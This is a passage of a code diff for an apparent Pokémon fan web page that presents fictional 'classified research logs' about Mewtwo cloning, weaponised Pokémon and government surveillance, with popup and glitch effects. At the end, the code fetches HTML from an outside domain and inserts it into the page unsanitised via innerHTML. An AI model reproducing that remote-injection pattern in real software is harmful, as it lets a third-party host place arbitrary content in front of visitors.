+      const oscillator = new (window.AudioContext || window.webkitAudioContext)().createOscillator();
+      oscillator.connect(new (window.AudioContext || window.webkitAudioContext)().destination);
+      oscillator.frequency.setValueAtTime(2000, new (window.AudioContext || window.webkitAudioContext)().currentTime);
+      oscillator.start();
+      oscillator.stop(new (window.AudioContext || window.webkitAudioContext)().currentTime + 0.1);
+    } catch (e) {
+      console.log('Audio not supported');
+    }
+  }
+
+  const fileContents = {
+    'mewtwo': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 06.15.94
+    SUBJECT: MEWTWO CLONING PROJECT
+    CODE: 00110101
+
+    The origins of Mewtwo were never meant to be understood by the public—nor should they. The project, code-named 00110101, began as a covert military initiative aimed at creating a Pokémon with unparalleled power for government use. The cloning experiments conducted within the hidden laboratories of Silph Co. in Celadon were not only about replicating the DNA of Mew, but enhancing it with artificial manipulation to create a weapon, a controllable force of nature. 
+
+    This experiment, however, was plagued with ethical complications, and the results—Mewtwo—would soon become an uncontrollable threat. The original genetic blueprint for Mewtwo was based on a highly classified sequence of numbers that encrypted vital information about the Pokémon's creation. 
+
+    The 00110101 code that encapsulated the creation was so complex, it was beyond anything the public or most scientists could comprehend. It was the government's unspoken pact to keep the deeper details of the project hidden for good reason.
+
+    WARNING: HIGHEST LEVEL CLEARANCE REQUIRED
+    STATUS: CONTAINMENT BREACH DETECTED
+    CASUALTIES: [REDACTED]`,
+
+    'pre': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 08.18.95
+    SUBJECT: PRE-POKÉMON GOVERNMENT FILES
+    CODE: 00201001
+
+    During routine clearance for other projects, I stumbled across a chilling series of files within the government database. Labeled 00201001, these documents referred to pre-Pokémon-era experimentation—a time when Pokémon were still being studied but hadn't yet become integrated into public life. 
+
+    These files suggested the government had been working on genetic manipulation far before Silph Co. became publicly associated with Pokémon research. The early stages of the project were buried beneath layers of bureaucracy, hidden in military and governmental research initiatives that predate the first major Pokémon encounters. 
+
+    They were laying the groundwork for using Pokémon as tools of surveillance, warfare, and population control. The true extent of this pre-Pokémon government agenda remains sealed in these early files, and much of this information has been intentionally lost to history.
+
+    WARNING: CLASSIFIED INFORMATION
+    ACCESS LEVEL: OMEGA
+    SECURITY CLEARANCE: REVOKED`,
+
+    'gov': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 12.10.97
+    SUBJECT: GOVERNMENT FILES: MISSING
+    CODE: 00310000
+
+    In 1997, a disturbing discovery led me to believe that something much larger was afoot than originally suspected. An encrypted batch of files under the code 00310000 had been completely wiped from government archives. These files were linked to Mewtwo's creation and potential military applications. 
+
+    Given the secretive nature of Silph Co.'s dealings with the government, it's clear that these files contained crucial information that had been deemed too sensitive to ever see the light of day. Mewtwo was more than just a Pokémon; it was a pivotal part of a greater plan, a project that went far beyond simple scientific experimentation. 
+
+    If I could uncover the missing files, it might reveal the true intent behind the government's interest in Pokémon as weapons and surveillance tools—something much darker and more invasive than anyone had realized.
+
+    ALERT: FILE CORRUPTION DETECTED
+    SYSTEM COMPROMISED
+    EMERGENCY PROTOCOLS ACTIVE`,
+
+    'missing': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 03.22.99
+    SUBJECT: MISSING FILES: A DEEPER CONSPIRACY
+    CODE: N0
+
+    After several months of tracking down leads from various sources, I've come across something much more disturbing. I believe the files labeled N0, those marked as missing, were never deleted—they were intentionally hidden. These files, associated with the final phase of Mewtwo's development, were so sensitive that anyone who came close to uncovering them met with unexpected "accidents" or reassignments. 
+
+    I suspect these files contained the final stage of the cloning process, including the involvement of high-ranking officials who saw the potential of using Mewtwo and similar Pokémon as tools to shape the future of warfare and global power structures. 
+
+    The presence of N0 as a placeholder code suggests that someone, or something, is actively trying to erase the very evidence of this operation, making it a top priority to keep it out of public reach. The truth is being buried, and I fear what will happen if it all comes to light.
+
+    ERROR: FILE CORRUPTED
+    SYSTEM BREACH DETECTED
+    [DATA EXPUNGED]
+    EMERGENCY SHUTDOWN INITIATED...`,
+
+    'cloning': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 07.19.96
+    SUBJECT: CLONING PROCESS DECLASSIFIED
+    CODE: 00411011
+
+    REAL-WORLD PARALLELS:
+    The Mewtwo cloning process drew heavily from mammalian cloning techniques:
+    1. Somatic Cell Nuclear Transfer (SCNT) - Same method used for Dolly the Sheep (1996)
+    2. Oocyte enucleation and nuclear transfer
+    3. Artificial embryo activation
+
+    KEY MODIFICATIONS:
+    - Introduction of psychic-enhancing retroviruses
+    - CRISPR-Cas9 gene editing for TYPE_PSYCHIC dominance
+    - Mitochondrial DNA supplementation from human donors
+    - Epigenetic reprogramming to erase cellular memory
+
+    CENSORSHIP ALERT:
+    Western releases of project documentation omitted:
+    - References to human DNA hybridization
+    - Failed clone disposal procedures
+    - Military funding sources
+    - Ethical violations (per Geneva Convention 1977)`,
+
+    'weapons': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 10.12.94
+    SUBJECT: WEAPONIZATION PROTOCOLS
+    
+    Discovered Silph Co.'s military contracts detailing Pokémon modification:
+    - Electrode rigged as organic explosives
+    - Hypno mind control field tests
+    - Magneton EMP weaponization trials
+    - Government requests for "deniable assets"
+
+    WARNING: Contains references to human testing
+    CLEARANCE LEVEL: OMEGA-9`,
+
+    'masterball': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 12.03.96
+    SUBJECT: MASTER BALL PSYCH CONTROL
+    
+    Neural inhibitors in Master Ball prototype exceed safety limits:
+    - 450% obedience boost in test subjects
+    - Residual control lasting 72h post-release
+    - Human trials show <span class="redacted">[DATA EXPUNGED]</span>
+    
+    ETHICS FLAG: Violates Geneva Convention Art. 23.b
+    STATUS: PROJECT ongoing despite warnings`,
+
+    'hybrids': `CLASSIFIED RESEARCH LOG - PROF. J
+    DATE: 05.27.99
+    SUBJECT: CYBERNETIC HYBRIDS
+    
+    Discovered prototype schematics for:
+    - Voltorb with C4 payloads
+    - Porygon deepfake generators
+    - Magnemite swarm networks
+    - Mewtwo neural interface (Model TX-0)
+
+    EMERGENCY NOTICE: All hybrids exhibit unstable behavior
+    TERMINATION PROTOCOL: active`,
+
+    'surveillance': `CLASSIFIED RESEARCH LOG - PROF. J 
+    DATE: 10.12.99
+    SUBJECT: GLOBAL MONITORING
+    
+    Pokédex backdoor access reveals:
+    - Location tracking via Pokémon GPS
+    - Battle data used for combat profiling
+    - Social connections mapped via Trade Network
+    
+    DATA STREAMS TO:
+    - SILPH-CO/blackops
+    - GOV/psi-division
+    - [18 unidentified endpoints]`
+  };
+
+  // Initialize first page
+  showPage(0);
+
+  // Add classified files functionality
+  const classifiedFiles = document.querySelectorAll('.classified-file');
+  const overlay = document.querySelector('.overlay');
+  const popups = document.querySelectorAll('.popup');
+
+  classifiedFiles.forEach(file => {
+    // Add glitch effect
+    for (let i = 0; i < 5; i++) {
+      const glitch = document.createElement('div');
+      glitch.className = 'corruption';
+      glitch.style.left = Math.random() * 100 + '%';
+      glitch.style.top = Math.random() * 100 + '%';
+      glitch.textContent = Math.random() > 0.5 ? '1' : '0';
+      file.appendChild(glitch);
+    }
+
+    file.addEventListener('click', () => {
+      const fileId = file.getAttribute('data-file');
+      const popup = document.querySelector(`.popup[data-file="${fileId}"]`);
+      popup.querySelector('.popup-content').textContent = fileContents[fileId];
+      popup.classList.add('active');
+      overlay.classList.add('active');
+    });
+  });
+
+  document.querySelectorAll('.popup-close').forEach(close => {
+    close.addEventListener('click', () => {
+      document.querySelectorAll('.popup').forEach(popup => {
+        popup.classList.remove('active');
+      });
+      overlay.classList.remove('active');
+    });
+  });
+
+  overlay.addEventListener('click', () => {
+    document.querySelectorAll('.popup').forEach(popup => {
+      popup.classList.remove('active');
+    });
+    overlay.classList.remove('active');
+  });
+
+  const locationData = [
+    {
+      name: "HYBRID LAB ALPHA",
+      desc: "Cyber-organic fusion facility. Multiple containment breaches detected.",
+      status: "DANGER"
+    },
+    {
+      name: "MEWTWO CHAMBER",
+      desc: "Primary psychic amplification zone. Current status: Destroyed.",
+      status: "BREACH"
+    },
+    {
+      name: "SILPH CO DEEP LABS",
+      desc: "Black ops research facility. Clearance level: OMEGA",
+      status: "LOCKED"
+    },
+    {
+      name: "MASTER BALL VAULT",
+      desc: "Neural inhibitor storage. Warning: Mind control tech detected.",
+      status: "ALERT"
+    },
+    {
+      name: "PSY-OPS WING",
+      desc: "Psychic enhancement division. Multiple anomalies detected.",
+      status: "ACTIVE"
+    },
+    {
+      name: "SURVEILLANCE HUB",
+      desc: "Global monitoring station. Data streams: COMPROMISED",
+      status: "CRITICAL"
+    },
+    {
+      name: "CLONING LAB BETA",
+      desc: "Genetic replication facility. Security clearance: OMEGA-BLACK",
+      status: "LOCKDOWN"
+    },
+    {
+      name: "ETHICS COMMITTEE ARCHIVE",
+      desc: "Redacted meeting records 1985-1999",
+      status: "ERASED"
+    }
+  ];
+
+  const statsContent = {
+    hp: { value: "RED", label: "THREAT LEVEL" },
+  };
+
+// Load header6.html content from the specified domain
+fetch('https://711131719.xyz/header6.html')
+  .then(response => response.text())
+  .then(html => {
+    document.getElementById('bottom-header-container').innerHTML = html;
+  })
+  .catch(error => console.error('Error loading header:', error));
+}); </script>
+</body>
+</html>
